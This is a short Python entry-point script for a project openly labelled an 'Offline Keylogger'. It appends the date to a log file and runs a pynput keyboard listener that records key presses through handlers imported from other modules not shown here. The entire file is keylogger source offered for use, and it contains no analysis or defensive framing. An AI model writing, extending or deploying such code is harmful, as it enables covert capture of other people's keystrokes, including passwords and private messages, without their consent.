import threading
import time
import json
from pynput.keyboard import Listener
from src.functions.listener import *
from src.functions.management import *
from datetime import date

dataToday = date.today()  # gets date

# Offline Keylogger!!

def join():
    with open(fileName, "a") as f:
        f.write(str(dataToday) + "\n")
        f.close()

    with Listener(on_press=on_press) as ls:
        while True:
            ls.join()


if __name__ == "__main__":
    try:
        threading.Thread(target=join()).start()
    except Exception as e:
        print(e)


